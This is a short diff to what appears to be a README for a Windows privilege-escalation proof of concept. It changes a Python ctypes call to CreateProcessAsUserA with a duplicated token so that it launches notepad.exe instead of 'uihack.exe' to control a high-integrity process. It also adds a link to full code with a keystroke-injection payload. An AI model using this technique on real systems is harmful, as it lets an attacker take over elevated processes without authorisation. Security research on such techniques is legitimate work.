@@ -99,7 +99,7 @@ lpStartupInfo.cb = ctypes.sizeof(lpStartupInfo)
 lpStartupInfo.dwFlags = 0x00000001
 lpStartupInfo.wShowWindow = 5
 lpProcessInformation = PROCESS_INFORMATION()
-lpApplicationName = os.path.join(os.getcwd(), "dist\\uihack.exe")
+lpApplicationName = "notepad.exe" # Path to executable that controls High IL process
 
 if not ctypes.windll.advapi32.CreateProcessAsUserA(dtoken, None, lpApplicationName, None, None, False,
 													(0x04000000 | 0x00000010), None, None, ctypes.byref(lpStartupInfo),
@@ -109,3 +109,6 @@ if not ctypes.windll.advapi32.CreateProcessAsUserA(dtoken, None, lpApplicationNa
 else:
 	print "[+] Created process PID: {pid} using CreateProcessAsUserA".format(pid=lpProcessInformation.dwProcessId)
 ```
+
+Full code can be found here, with payload example to send keyboard events
+* https://github.com/rootm0s/UIAP
